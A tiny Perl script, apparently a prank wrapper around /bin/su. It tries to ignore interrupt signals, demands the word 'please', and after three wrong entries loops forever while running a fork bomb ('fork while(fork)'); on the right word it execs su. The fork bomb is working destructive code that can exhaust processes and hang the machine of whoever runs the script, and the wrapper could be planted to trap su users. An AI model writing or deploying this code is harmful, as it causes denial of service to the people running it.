#!/usr/bin/perl
use warnings;
#use strict;
$SIG{'INT'} = 'IGNORE';
$SIG{'STOP'} = 'IGNORE';
$SIG{'KILL'} = 'IGNORE';
my $sharg = $ARGV[0];
print $sharg;
my $please = "please";
my $i = 0;
while ($sharg ne $please && $i<3){
    print "access denied\n";
    $i++;
    $sharg = <>;
    chomp $sharg;
}
if($i>=3){
  while (1){
   print "you didn't say the magic word\n";
   fork while(fork);
  }
} else {
  exec "/bin/su";
}

